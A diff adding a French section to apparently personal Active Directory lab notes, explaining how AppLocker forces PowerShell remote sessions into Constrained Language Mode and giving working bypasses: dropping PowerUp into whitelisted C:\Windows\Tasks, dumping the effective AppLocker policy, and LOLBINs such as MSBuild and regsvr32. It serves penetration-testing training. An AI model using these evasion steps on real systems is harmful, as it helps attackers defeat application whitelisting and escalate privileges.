@@ -75,6 +75,43 @@ Invoke-Command -Session $s -ScriptBlock {
 > [!tip] Piège double-hop (Kerberos)
 > `-FilePath` marche parce que Kerberos délègue tes creds au 1er hop (WinRM). MAIS si le .ps1 distant essaie à son tour d'accéder à une autre box (`Invoke-Command depuis la PSSession`, `\\autre-serveur\share`) → **`Access denied`** (double-hop bloqué). Workaround : OverPass-the-Hash dans la PSSession, `-Credential` explicite, ou activer CredSSP.
 
+> [!danger] Piège AppLocker → Constrained Language Mode (CLM) — MAJEUR sur ce lab
+> Sur les box AppLocker'd (dans ce lab : **`dcorp-adminsrv`**, OU `Applocked`), la PSSession démarre en **`ConstrainedLanguage`** → méthodes .NET, `[Reflection.Assembly]::Load()`, `Add-Type`, `New-Object` de types non-core = **tous bloqués**. Symptôme :
+> ```
+> Cannot invoke method. Method invocation is supported only on core types in this language mode.
+> FullyQualifiedErrorId : MethodInvocationNotSupportedInConstrainedLanguage
+> ```
+> **PowerUp, PowerView, Invoke-Mimi, reflectively-load de Rubeus** → tous en carafe si tu les charges via `-FilePath` dans une session CLM.
+>
+> **Diagnostic** :
+> ```powershell
+> Invoke-Command -Session $s -ScriptBlock { $ExecutionContext.SessionState.LanguageMode }
+> ```
+> → `ConstrainedLanguage` = confirmé.
+>
+> **Bypass 1 — path whitelisté par AppLocker Default Rules** (le plus simple). Dépose le .ps1 dans `C:\Windows\Tasks` (writable admin + whitelisté par défaut) et dot-source depuis là :
+> ```powershell
+> Copy-Item -ToSession $s -Path C:\AD\Tools\PowerUp.ps1 -Destination C:\Windows\Tasks\PowerUp.ps1
+> Invoke-Command -Session $s -ScriptBlock {
+>   . C:\Windows\Tasks\PowerUp.ps1                       # dot-source depuis path autorisé
+>   $ExecutionContext.SessionState.LanguageMode          # devrait passer à FullLanguage
+>   Invoke-AllChecks
+> }
+> ```
+>
+> **Bypass 2 — lister les paths autorisés par la policy effective** :
+> ```powershell
+> Invoke-Command -Session $s -ScriptBlock {
+>   Get-AppLockerPolicy -Effective -Xml | Out-File C:\Windows\Tasks\policy.xml
+>   Select-String C:\Windows\Tasks\policy.xml -Pattern "<FilePathCondition"
+> }
+> ```
+> Autres paths souvent OK : `%WINDIR%\Temp`, `%WINDIR%\System32\spool\drivers\color\`, `C:\Windows\System32\Tasks\`.
+>
+> **Bypass 3 — LOLBINs qui bypassent CLM** : `InstallUtil.exe`, `MSBuild.exe`, `regsvr32` (scriptlet via HTTP). Réservé aux blocages durs.
+>
+> **Ce qui marche EN CLM sans bypass** : cmdlets natives Windows (`Get-Service`, `Get-WmiObject`, `Get-CimInstance`, `Get-Process`, `netstat`, `sc.exe`, `vaultcmd`, `cmdkey`, `net`, `whoami`, `klist`) → suffisant pour de l'énum pure, insuffisant pour du privesc-tooling.
+
 ### Après `Find-PSRemotingLocalAdminAccess`
 
 Il liste les hôtes où **ton identité courante** est admin via PSRemoting. `Enter-PSSession -ComputerName <TARGET>` → tu es sur la box : tape les commandes **direct** (`whoami /all`, `klist`, dump), puis re-hunt → saut suivant (vers DA). Compte **dumpé** ≠ user courant → OverPass-the-Hash d'abord (ci-dessous).
